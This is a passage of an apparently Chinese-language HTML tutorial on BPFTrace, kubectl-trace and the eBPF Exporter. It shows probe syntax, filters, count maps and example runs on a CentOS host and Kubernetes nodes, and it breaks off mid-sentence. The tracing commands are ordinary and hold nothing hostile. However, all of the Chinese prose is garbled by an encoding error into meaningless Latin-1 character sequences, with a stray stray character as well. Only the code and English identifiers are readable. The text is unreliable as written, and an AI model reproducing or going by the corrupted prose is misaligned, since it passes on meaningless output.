title="BPFTrace"></a>BPFTrace</h4><p>BPFTraceæ˜¯BPFçš„é«˜çº§è·Ÿè¸ªè¯­è¨€ã€‚å…è®¸ä½ ä½¿ç”¨ç®€æ´çš„DSLç¼–å†™BPFç¨‹åºï¼Œå¹¶å°†å®ƒä»¬ä¿å­˜ä¸ºå¯ä»¥æ‰§è¡Œçš„è„šæœ¬ï¼Œè€Œæ— éœ€æ‰‹åŠ¨ç¼–è¯‘å’ŒåŠ è½½å®ƒä»¬åˆ°å†…æ ¸ä¸­ã€‚è¯¥è¯­è¨€å—åˆ°å…¶ä»–çŸ¥åå·¥å…·çš„å¯å‘ï¼Œä¾‹å¦‚<code>awk</code>å’Œ<code>DTrace</code>ã€‚</p><p>ä¸ç›´æ¥ä½¿ç”¨BCCæˆ–å…¶ä»–BPFå·¥å…·ç¼–å†™ç¨‹åºç›¸æ¯”ï¼Œä½¿ç”¨BPFTraceçš„ä¼˜åŠ¿ä¹‹ä¸€æ˜¯BPFTraceæä¾›äº†è®¸å¤šä½ ä¸éœ€è¦è‡ªå·±å®ç°çš„å†…ç½®åŠŸèƒ½ï¼Œä¾‹å¦‚èšåˆä¿¡æ¯å’Œåˆ›å»ºç›´æ–¹å›¾ã€‚</p><p>ä»¥Centos8ä¸ºä¾‹ï¼Œå¦‚æœä½ å®‰è£…äº†<code>epel-release</code>æ”¯æŒï¼Œé‚£ä¹ˆä¸€æ¡dnfå°±å¯ä»¥å®‰è£…bpftrace</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# dnf install bpftrace</span><br></pre></td></tr></table></figure><p>BPFTraceæ‰§è¡Œçš„ç¨‹åºå…·æœ‰ç®€æ´çš„è¯­æ³•ã€‚æˆ‘ä»¬å¯ä»¥å°†å®ƒä»¬åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š<code>header, action blocks, and footer</code>ã€‚ <code>header</code>æ˜¯BPFTraceåœ¨åŠ è½½ç¨‹åºæ—¶æ‰§è¡Œçš„ç‰¹æ®Šå—ï¼›å®ƒé€šå¸¸ç”¨äºåœ¨è¾“å‡ºé¡¶éƒ¨æ‰“å°ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚åºè¨€ã€‚åŒæ ·ï¼Œ<code>footer</code>æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å—ï¼ŒBPFTraceåœ¨ç»ˆæ­¢ç¨‹åºä¹‹å‰æ‰§è¡Œä¸€æ¬¡ã€‚ <code>header</code>å’Œ<code>footer</code>éƒ½æ˜¯BPFTraceç¨‹åºä¸­çš„å¯é€‰éƒ¨åˆ†ã€‚ä¸€ä¸ª BPFTraceç¨‹åºå¿…é¡»è‡³å°‘æœ‰ä¸€ä¸ª<code>action block</code>ã€‚<code>action block</code>æ˜¯æˆ‘ä»¬æŒ‡å®šè¦è·Ÿè¸ªçš„æ¢é’ˆä»¥åŠå†…æ ¸è§¦å‘è¿™äº›æ¢é’ˆçš„äº‹ä»¶æ—¶æ‰§è¡Œçš„æ“ä½œçš„åœ°æ–¹ã€‚ä¸‹ä¸€ä¸ªç¤ºä¾‹æˆ‘ä»¬å°†å±•ç¤ºè¿™ä¸‰ä¸ªéƒ¨åˆ†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">    &#123;</span><br><span class="line">      printf("starting BPFTrace program\n")</span><br><span class="line">&#125;</span><br><span class="line">kprobe:do_sys_open</span><br><span class="line">    &#123;</span><br><span class="line">      printf("opening file descriptor: %s\n", str(arg1))</span><br><span class="line">&#125;</span><br><span class="line">END</span><br><span class="line">    &#123;</span><br><span class="line">      printf("exiting BPFTrace program\n")</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>header</code>éƒ¨åˆ†æ€»æ˜¯ç”¨å…³é”®å­—BEGINæ ‡è®°ï¼Œè€Œ<code>footer</code>éƒ¨åˆ†æ€»æ˜¯ç”¨å…³é”®å­—ENDæ ‡è®°ã€‚ è¿™äº›å…³é”®å­—ç”±BPFTraceä¿ç•™ã€‚ <code>action block</code>æ ‡è¯†ç¬¦å®šä¹‰äº†ä½ å¸Œæœ›å°†BPFæ“ä½œé™„åŠ åˆ°çš„æ¢æµ‹å™¨ã€‚åœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åœ¨å†…æ ¸æ¯æ¬¡æ‰“å¼€æ–‡ä»¶æ—¶æ‰“å°ä¸€è¡Œæ—¥å¿—ã€‚</p><p>é™¤äº†è¯†åˆ«ç¨‹åºéƒ¨åˆ†ä¹‹å¤–ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥åœ¨å‰é¢çš„ç¤ºä¾‹ä¸­çœ‹åˆ°æœ‰å…³è¯­è¨€è¯­æ³•çš„æ›´å¤šç»†èŠ‚ã€‚BPFTraceæä¾›äº†ä¸€äº›å¸®åŠ©ç¨‹åºï¼Œè¿™äº›å¸®åŠ©ç¨‹åºåœ¨ç¨‹åºç¼–è¯‘æ—¶è¢«ç¿»è¯‘æˆBPFä»£ç ã€‚ å¸®åŠ©ç¨‹åº<code>printf</code>æ˜¯Cå‡½æ•°<code>printf</code>çš„åŒ…è£…å™¨ï¼Œå®ƒåœ¨ä½ éœ€è¦æ—¶æ‰“å°ç¨‹åºè¯¦ç»†ä¿¡æ¯ã€‚stræ˜¯ä¸€ä¸ªå†…ç½®çš„è¾…åŠ©å‡½æ•°ï¼Œå®ƒå°†CæŒ‡é’ˆè½¬æ¢ä¸ºå…¶å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚è®¸å¤šå†…æ ¸å‡½æ•°æ¥æ”¶æŒ‡å‘å­—ç¬¦çš„æŒ‡é’ˆä½œä¸ºå‚æ•°ã€‚è¿™ä¸ªè¾…åŠ©å‡½æ•°ä¼šä¸ºä½ ç¿»è¯‘é‚£äº›æŒ‡å‘å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚</p><p>BPFTraceå¯ä»¥è¢«è®¤ä¸ºæ˜¯ä¸€ç§åŠ¨æ€è¯­è¨€ï¼Œå› ä¸ºå®ƒä¸çŸ¥é“å†…æ ¸æ‰§è¡Œæ¢é’ˆæ—¶å¯èƒ½æ”¶åˆ°çš„å‚æ•°æ•°é‡ã€‚è¿™å°±æ˜¯BPFTraceæä¾›å‚æ•°è¾…åŠ©å‡½æ•°æ¥è®¿é—®å†…æ ¸å¤„ç†çš„ä¿¡æ¯çš„åŸå› ã€‚BPFTraceæ ¹æ®å—æ¥æ”¶çš„å‚æ•°æ•°é‡åŠ¨æ€ç”Ÿæˆè¿™äº›å¸®åŠ©ç¨‹åºï¼Œå¯ä»¥é€šè¿‡å…¶åœ¨å‚æ•°åˆ—è¡¨ä¸­çš„ä½ç½®è®¿é—®ä¿¡æ¯ã€‚åœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œ<code>arg1</code>æ˜¯å¯¹openç³»ç»Ÿè°ƒç”¨ä¸­ç¬¬äºŒä¸ªå‚æ•°çš„å¼•ç”¨ï¼Œå®ƒå¼•ç”¨äº†æ–‡ä»¶è·¯å¾„ã€‚</p><p>è¦æ‰§è¡Œæ­¤ç¤ºä¾‹ï¼Œå¯ä»¥å°†å…¶ä¿å­˜åœ¨æ–‡ä»¶ä¸­å¹¶ä½¿ç”¨æ–‡ä»¶è·¯å¾„ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°è¿è¡ŒBPFTraceï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftrace /tmp/example.bt</span><br></pre></td></tr></table></figure><p>BPFTraceè¯­è¨€åœ¨è®¾è®¡æ—¶è€ƒè™‘äº†è„šæœ¬ã€‚åœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œæ‚¨å·²ç»çœ‹åˆ°äº†è¯¥è¯­è¨€çš„ç®€æ´ç‰ˆæœ¬ã€‚ ä½†æ˜¯ï¼Œä½ ä¹Ÿå¯ä»¥æ— éœ€å°†è¿™äº›å•è¡Œç¨‹åºå­˜å‚¨åœ¨æ–‡ä»¶ä¸­å³å¯æ‰§è¡Œå®ƒä»¬ï¼›å¯ä»¥åœ¨æ‰§è¡ŒBPFTraceæ—¶ä½¿ç”¨é€‰é¡¹<code>-e</code>è¿è¡Œå®ƒä»¬ã€‚ å¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftrace -e "kprobe:do_sys_open &#123; @opens[arg1] = count() &#125;"</span><br><span class="line">Attaching 1 probe...</span><br><span class="line">@opens[94865239214048]: 1</span><br><span class="line">@opens[140736438418016]: 1</span><br><span class="line">@opens[140297599132240]: 1</span><br><span class="line">@opens[93945902307104]: 1</span><br><span class="line">@opens[94865239225648]: 1</span><br><span class="line">@opens[94865239215744]: 1</span><br><span class="line">@opens[93945902306496]: 1</span><br><span class="line">@opens[139870543823312]: 1</span><br><span class="line">@opens[139870563935520]: 1</span><br><span class="line">@opens[140267846679600]: 1</span><br><span class="line">@opens[139870563971376]: 1</span><br><span class="line">@opens[94774158865584]: 1</span><br><span class="line">@opens[140449669998819]: 1</span><br><span class="line">@opens[93945902302160]: 1</span><br><span class="line">@opens[93945902300160]: 1</span><br><span class="line">@opens[93907893935248]: 1</span><br></pre></td></tr></table></figure><h5 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤"></a>è¿‡æ»¤</h5><p>å½“ä½ è¿è¡Œå‰é¢çš„ä¾‹å­æ—¶ï¼Œä½ å¯èƒ½ä¼šå¾—åˆ°ä¸€ä¸ªç³»ç»Ÿä¸æ–­æ‰“å¼€çš„æ–‡ä»¶æµï¼Œç›´åˆ°ä½ æŒ‰ä¸‹<code>Ctrl-C</code>é€€å‡ºç¨‹åºã€‚ é‚£æ˜¯å› ä¸ºæˆ‘ä»¬å‘Šè¯‰BPFæ‰“å°å†…æ ¸æ‰“å¼€çš„æ¯ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä½ åªæƒ³é’ˆå¯¹ç‰¹å®šæ¡ä»¶æ‰§è¡Œ<code>action block</code>ã€‚ BPFTraceç§°ä¹‹ä¸ºè¿‡æ»¤ã€‚</p><p>ä½ å¯ä»¥å°†ä¸€ä¸ªè¿‡æ»¤å™¨å…³è”åˆ°æ¯ä¸ª<code>action block</code>ã€‚ å®ƒä»¬åƒ<code>action block</code>ä¸€æ ·è¯„ä¼°ï¼Œä½†å¦‚æœè¿‡æ»¤å™¨è¿”å›falseå€¼ï¼Œåˆ™æ“ä½œä¸ä¼šæ‰§è¡Œã€‚ä»–ä»¬è¿˜å¯ä»¥è®¿é—®è¯¥è¯­è¨€çš„å…¶ä½™éƒ¨åˆ†ï¼ŒåŒ…æ‹¬æ¢æµ‹å‚æ•°å’Œè¾…åŠ©å‡½æ•°ã€‚ è¿™äº›è¿‡æ»¤å™¨å°è£…åœ¨åŠ¨ä½œæ ‡å¤´ä¹‹åçš„ä¸¤ä¸ªæ–œæ ä¸­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kprobe:do_sys_open /str(arg1) == "/tmp/example.bt"/</span><br><span class="line">    &#123;</span><br><span class="line">      printf("opening file descriptor: %s\n", str(arg1))</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†æˆ‘ä»¬çš„åŠ¨ä½œå—ä¼˜åŒ–ä¸ºä»…å½“å†…æ ¸æ‰“å¼€çš„æ–‡ä»¶æ˜¯æˆ‘ä»¬ç”¨æ¥å­˜å‚¨è¿™ä¸ªä¾‹å­çš„æ–‡ä»¶æ—¶æ‰æ‰§è¡Œã€‚å¦‚æœä½ ç”¨æ–°çš„è¿‡æ»¤å™¨è¿è¡Œç¨‹åºï¼Œä½ ä¼šçœ‹åˆ°å®ƒæ‰“å°äº†æ ‡é¢˜ï¼Œä½†å®ƒåœ¨é‚£é‡Œåœæ­¢æ‰“å°ã€‚ è¿™æ˜¯å› ä¸ºç”±äºæˆ‘ä»¬çš„æ–°è¿‡æ»¤å™¨ï¼Œä¹‹å‰è§¦å‘æˆ‘ä»¬æ“ä½œçš„æ¯ä¸ªæ–‡ä»¶ç°åœ¨éƒ½è¢«è·³è¿‡äº†ã€‚å¦‚æœä½ åœ¨ä¸åŒçš„ç»ˆç«¯ä¸­å¤šæ¬¡æ‰“å¼€ç¤ºä¾‹æ–‡ä»¶ï¼Œä½ å°†çœ‹åˆ°å½“è¿‡æ»¤å™¨åŒ¹é…æˆ‘ä»¬çš„æ–‡ä»¶è·¯å¾„æ—¶å†…æ ¸å¦‚ä½•æ‰§è¡Œæ“ä½œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftrace /tmp/example.bt</span><br><span class="line">    Attaching 3 probes...</span><br><span class="line">    starting BPFTrace program</span><br><span class="line">    opening file descriptor: /tmp/example.bt</span><br><span class="line">    opening file descriptor: /tmp/example.bt</span><br><span class="line">    opening file descriptor: /tmp/example.bt</span><br><span class="line">    ^Cexiting BPFTrace program</span><br></pre></td></tr></table></figure><h5 id="åŠ¨æ€æ˜ å°„"><a href="#åŠ¨æ€æ˜ å°„" class="headerlink" title="åŠ¨æ€æ˜ å°„"></a>åŠ¨æ€æ˜ å°„</h5><p>BPFTraceå®ç°çš„ä¸€é¡¹æ–¹ä¾¿çš„åŠŸèƒ½æ˜¯åŠ¨æ€æ˜ å°„å…³è”ã€‚ å®ƒå¯ä»¥åŠ¨æ€ç”ŸæˆBPFæ˜ å°„ï¼Œä½ å¯ä»¥å°†å…¶ç”¨äºæœ¬ä¹¦ä¸­çœ‹åˆ°çš„è®¸å¤šæ“ä½œã€‚æ‰€æœ‰æ˜ å°„å…³è”éƒ½ä»¥å­—ç¬¦<code>@</code>å¼€å¤´ï¼Œåé¢è·Ÿè¦åˆ›å»ºçš„æ˜ å°„çš„åç§°ã€‚ è¿˜å¯ä»¥é€šè¿‡ä¸ºå®ƒä»¬åˆ†é…å€¼æ¥å…³è”è¿™äº›æ˜ å°„ä¸­çš„æ›´æ–°å…ƒç´ ã€‚</p><p>å¦‚æœæˆ‘ä»¬ä»¥æœ¬èŠ‚å¼€å¤´çš„ç¤ºä¾‹ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥æ±‡æ€»ç³»ç»Ÿæ‰“å¼€ç‰¹å®šæ–‡ä»¶çš„é¢‘ç‡ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦è®¡ç®—å†…æ ¸åœ¨ç‰¹å®šæ–‡ä»¶ä¸Šè¿è¡Œopenç³»ç»Ÿè°ƒç”¨çš„æ¬¡æ•°ï¼Œç„¶åå°†è¿™äº›è®¡æ•°å™¨å­˜å‚¨åœ¨æ˜ å°„ä¸­ã€‚ä¸ºäº†è¯†åˆ«è¿™äº›èšåˆï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ–‡ä»¶è·¯å¾„ä½œä¸ºæ˜ å°„çš„é”®ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kprobe:do_sys_open</span><br><span class="line">&#123;</span><br><span class="line"> @opens[str(arg1)] = count()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç¨‹åºåè¾“å‡ºå¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftrace /tmp/example.bt</span></span><br><span class="line">    Attaching 3 probes...</span><br><span class="line">    starting BPFTrace program</span><br><span class="line">    ^Cexiting BPFTrace program</span><br><span class="line">    @opens[/var/lib/snapd/lib/gl/haswell/libdl.so.2]: 1</span><br><span class="line">    @opens[/var/lib/snapd/lib/gl32/x86_64/libdl.so.2]: 1</span><br><span class="line">    ...</span><br><span class="line">    @opens[/usr/lib/locale/en.utf8/LC_TIME]: 10</span><br><span class="line">    @opens[/usr/lib/locale/en_US/LC_TIME]: 10</span><br><span class="line">    @opens[/usr/share/locale/locale.alias]: 12</span><br><span class="line">    @opens[/proc/8483/cmdline]: 12</span><br></pre></td></tr></table></figure><p>å¦‚ä½ æ‰€è§ï¼ŒBPFTraceåœ¨åœæ­¢ç¨‹åºæ‰§è¡Œæ—¶æ‰“å°æ˜ å°„çš„å†…å®¹ã€‚å®ƒæ±‡æ€»äº†å†…æ ¸åœ¨æˆ‘ä»¬ç³»ç»Ÿä¸­æ‰“å¼€æ–‡ä»¶çš„é¢‘ç‡ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒBPFTraceæ€»æ˜¯ä¼šåœ¨å®ƒç»ˆæ­¢æ—¶æ‰“å°å®ƒåˆ›å»ºçš„æ¯ä¸ªæ˜ å°„çš„å†…å®¹ã€‚ æ‚¨æ— éœ€æŒ‡å®šè¦æ‰“å°çš„æ˜ å°„ï¼›ä½ å¯ä»¥é€šè¿‡ä½¿ç”¨å†…ç½®å‡½æ•°clearæ¸…é™¤ENDå—å†…çš„æ˜ å°„æ¥æ›´æ”¹è¯¥è¡Œä¸ºã€‚ è¿™æ˜¯å› ä¸ºæ‰“å°æ˜ å°„æ€»æ˜¯å‘ç”Ÿåœ¨<code>footer</code>å—æ‰§è¡Œä¹‹åã€‚</p><h4 id="kubectl-trace"><a href="#kubectl-trace" class="headerlink" title="kubectl-trace"></a>kubectl-trace</h4><p><code>kubectl-trace</code>æ˜¯Kuberneteså‘½ä»¤è¡Œkubectlçš„æ’ä»¶ã€‚å®ƒå¯ä»¥å¸®åŠ©ä½ åœ¨Kubernetesé›†ç¾¤ä¸­å¤„ç†BPFTraceç¨‹åºï¼Œè€Œæ— éœ€å®‰è£…ä»»ä½•é¢å¤–çš„åŒ…æˆ–æ¨¡å—ã€‚å®ƒé€šè¿‡ä½¿ç”¨å®¹å™¨é•œåƒè°ƒåº¦ä¸€ä¸ª<code>Kubernetes job</code>æ¥å®ç°è¿™ä¸€ç‚¹ï¼Œè¯¥å®¹å™¨é•œåƒå·²ç»å®‰è£…äº†è¿è¡Œç¨‹åºæ‰€éœ€çš„ä¸€åˆ‡ã€‚ æ­¤é•œåƒç§°ä¸º<code>trace-runner</code>ï¼Œå®ƒä¹Ÿå¯ä»¥åœ¨å…¬å…±Dockerä¸­ä½¿ç”¨ã€‚Ã¥</p><h5 id="å®‰è£…-1"><a href="#å®‰è£…-1" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h5><p>ä½ éœ€è¦ä½¿ç”¨Goçš„å·¥å…·é“¾ä»å…¶æºå­˜å‚¨åº“å®‰è£…<code>kubectl-trace</code>ï¼Œå› ä¸ºå…¶å¼€å‘äººå‘˜ä¸æä¾›ä»»ä½•äºŒè¿›åˆ¶åŒ…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get -u github.com/iovisor/kubectl-trace/cmd/kubectl-trace</span><br></pre></td></tr></table></figure><p>åœ¨Goçš„å·¥å…·é“¾ç¼–è¯‘ç¨‹åºå¹¶å°†å…¶æ”¾å…¥è·¯å¾„åï¼Œkubectlçš„æ’ä»¶ç³»ç»Ÿä¼šè‡ªåŠ¨æ£€æµ‹åˆ°è¿™ä¸ªæ–°æ’ä»¶ã€‚<code>kubectl-trace</code>ä¼šåœ¨ä½ ç¬¬ä¸€æ¬¡æ‰§è¡Œå®ƒæ—¶è‡ªåŠ¨ä¸‹è½½å®ƒåœ¨é›†ç¾¤ä¸­è¿è¡Œçš„Dockeré•œåƒã€‚</p><h5 id="æ£€æŸ¥k8sèŠ‚ç‚¹"><a href="#æ£€æŸ¥k8sèŠ‚ç‚¹" class="headerlink" title="æ£€æŸ¥k8sèŠ‚ç‚¹"></a>æ£€æŸ¥k8sèŠ‚ç‚¹</h5><p>å¯ä»¥ä½¿ç”¨<code>kubectl-trace</code>æ¥å®šä½è¿è¡Œå®¹å™¨çš„èŠ‚ç‚¹å’Œpodï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å®ƒæ¥å®šä½åœ¨è¿™äº›å®¹å™¨ä¸Šè¿è¡Œçš„è¿›ç¨‹ã€‚åœ¨ç¬¬ä¸€ç§æƒ…å†µä¸‹ï¼Œä½ å‡ ä¹å¯ä»¥è¿è¡Œä»»ä½•ä½ æƒ³è¦çš„BPFç¨‹åºã€‚ä½†æ˜¯ï¼Œåœ¨ç¬¬äºŒç§æƒ…å†µä¸‹åªèƒ½è¿è¡Œå°†ç”¨æˆ·ç©ºé—´æ¢æµ‹å™¨é™„åŠ åˆ°è¿™äº›è¿›ç¨‹çš„ç¨‹åºã€‚</p><p>å¦‚æœè¦åœ¨ç‰¹å®šèŠ‚ç‚¹ä¸Šè¿è¡ŒBPFç¨‹åºï¼Œåˆ™éœ€è¦ä¸€ä¸ªé€‚å½“çš„æ ‡è¯†ç¬¦ï¼Œä»¥ä¾¿Kuberneteså°†ä½œä¸šå®‰æ’åœ¨é€‚å½“çš„ä½ç½®ã€‚æœ‰äº†è¿™ä¸ªæ ‡è¯†ç¬¦ä¹‹åï¼Œè¿è¡Œç¨‹åºå°±å’Œè¿è¡Œä½ ä¹‹å‰çœ‹åˆ°çš„ç¨‹åºç±»ä¼¼ã€‚ å¦‚ä¸‹æ‰€ç¤ºæˆ‘ä»¬è¿è¡Œå•è¡Œæ¥è®¡ç®—æ–‡ä»¶æ‰“å¼€æ¬¡æ•°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl trace run node/node_identifier -e \</span><br><span class="line">      "kprobe:do_sys_open &#123; @opens[str(arg1)] = count() &#125;"</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨å‘½ä»¤<code>kubectl trace run</code>å°†å…¶å®‰æ’åœ¨ç‰¹å®šçš„é›†ç¾¤èŠ‚ç‚¹ä¸­ã€‚ æˆ‘ä»¬ä½¿ç”¨è¯­æ³•<code>node/...</code>æ¥å‘Šè¯‰<code>kubectl-trace</code>æˆ‘ä»¬æ­£åœ¨é’ˆå¯¹é›†ç¾¤ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ã€‚å¦‚æœæˆ‘ä»¬æƒ³é’ˆå¯¹ç‰¹å®šçš„podï¼Œæˆ‘ä»¬å¯ä»¥å°†<code>node/</code>æ›¿æ¢ä¸º<code>pod/</code>ã€‚</p><p>åœ¨ç‰¹å®šå®¹å™¨ä¸Šè¿è¡Œç¨‹åºæ›´åŠ å¤æ‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kubectl trace run pod/pod_identifier -n application_name -e &lt;&lt;PROGRAM</span><br><span class="line">    uretprobe:/proc/$container_pid/exe:"main.main" &#123;</span><br><span class="line">      printf("exit: %d\n", retval)</span><br><span class="line">    &#125;</span><br><span class="line">PROGRAM</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªå‘½ä»¤ä¸­æœ‰ä¸¤ä»¶äº‹æƒ…éœ€è¦å¼ºè°ƒã€‚ç¬¬ä¸€ä¸ªæ˜¯æˆ‘ä»¬éœ€è¦å®¹å™¨ä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºçš„åç§°æ‰èƒ½æ‰¾åˆ°å®ƒçš„è¿›ç¨‹ï¼› è¿™å¯¹åº”äºæˆ‘ä»¬ç¤ºä¾‹ä¸­çš„<code>application_name</code>ï¼Œ éœ€è¦ä½¿ç”¨åœ¨å®¹å™¨ä¸­æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„åç§°ï¼Œä¾‹å¦‚<code>nginx</code>æˆ–<code>memc ached</code>ã€‚ é€šå¸¸ï¼Œå®¹å™¨åªè¿è¡Œä¸€ä¸ªè¿›ç¨‹ï¼Œä½†è¿™ä¸ºæˆ‘ä»¬æä¾›äº†é¢å¤–çš„ä¿è¯ï¼Œå³æˆ‘ä»¬å°†ç¨‹åºé™„åŠ åˆ°æ­£ç¡®çš„è¿›ç¨‹ã€‚ç¬¬äºŒä¸ªæ–¹é¢æ˜¯åœ¨BPFç¨‹åºä¸­åŒ…å«<code>$container_pid</code>ã€‚ è¿™ä¸æ˜¯BPFTraceè¾…åŠ©å‡½æ•°ï¼Œè€Œæ˜¯<code>kubectl-trace</code>ç”¨ä½œè¿›ç¨‹æ ‡è¯†ç¬¦æ›¿æ¢çš„å ä½ç¬¦ã€‚åœ¨è¿è¡ŒBPFç¨‹åºä¹‹å‰ï¼Œ<code>trace-runner</code>ç”¨é€‚å½“çš„æ ‡è¯†ç¬¦æ›¿æ¢å ä½ç¬¦ï¼Œå¹¶å°†æˆ‘ä»¬çš„ç¨‹åºé™„åŠ åˆ°æ­£ç¡®çš„è¿›ç¨‹ã€‚</p><p>åœ¨æœ¬èŠ‚å’Œå‰é¢å‡ èŠ‚ä¸­ï¼Œæˆ‘ä»¬ä¸“æ³¨äºæ›´æœ‰æ•ˆåœ°è¿è¡ŒBPFç¨‹åºçš„å·¥å…·ï¼Œå³ä½¿åœ¨å®¹å™¨ç¯å¢ƒä¸­ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ åœ¨ä¸‹ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®ºä¸€ä¸ªæ›´å¥½çš„å·¥å…·ï¼Œå®ƒå°†BPFç¨‹åºæ”¶é›†çš„æ•°æ®ä¸å¼€æºç›‘æ§ç³»ç»ŸPrometheusé›†æˆåœ¨ä¸€èµ·ã€‚</p><h4 id="eBPF-Exporter"><a href="#eBPF-Exporter" class="headerlink" title="eBPF Exporter"></a>eBPF Exporter</h4><p><code>eBPF Exporter</code>æ˜¯ä¸€ä¸ªå…è®¸ä½ è‡ªå®šä¹‰BPFè·Ÿè¸ªæŒ‡æ ‡å¯¼å‡ºåˆ°Prometheusçš„å·¥å…·ã€‚Prometheusæ˜¯ä¸€ä¸ªé«˜åº¦å¯æ‰©å±•çš„ç›‘æ§å’Œè­¦æŠ¥ç³»ç»Ÿã€‚ä¸å…¶ä»–ç›‘æ§ç³»ç»Ÿä¸åŒçš„ä¸€ä¸ªå…³é”®å› ç´ æ˜¯å®ƒä½¿ç”¨æ‹‰å–ç­–ç•¥æ¥è·å–æŒ‡æ ‡ï¼Œè€Œä¸æ˜¯æœŸæœ›å®¢æˆ·ç«¯å°†æŒ‡æ ‡æ¨é€ç»™å®ƒã€‚è¿™å…è®¸ç”¨æˆ·ç¼–å†™å¯ä»¥ä»ä»»ä½•ç³»ç»Ÿæ”¶é›†æŒ‡æ ‡çš„è‡ªå®šä¹‰å¯¼å‡ºå™¨ï¼ŒPrometheusä½¿ç”¨APIæ¨¡å¼æå–å®ƒä»¬ã€‚<code>eBPF Exporter</code>å®ç°æ­¤APIä»¥ä»BPFç¨‹åºä¸­è·å–è·Ÿè¸ªæŒ‡æ ‡å¹¶å°†å®ƒä»¬å¯¼å…¥Prometheusã€‚</p><h5 id="å®‰è£…-2"><a href="#å®‰è£…-2" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h5><p>å°½ç®¡<code>eBPF Exporter</code>æä¾›äºŒè¿›åˆ¶åŒ…ï¼Œä½†æˆ‘ä»¬å»ºè®®ä»æºä»£ç å®‰è£…å®ƒï¼Œå› ä¸ºé€šå¸¸æ²¡æœ‰æ–°ç‰ˆæœ¬ã€‚ä»æºä»£ç æ„å»ºè¿˜å¯ä»¥è®©ä½ è®¿é—®BCCï¼ˆBPF ç¼–è¯‘å™¨é›†åˆï¼‰ä¹‹ä¸Šæ„å»ºçš„æ›´æ–°åŠŸèƒ½ã€‚</p><p>è¦ä»æºä»£ç å®‰è£…<code>eBPF Exporter</code>ï¼Œä½ 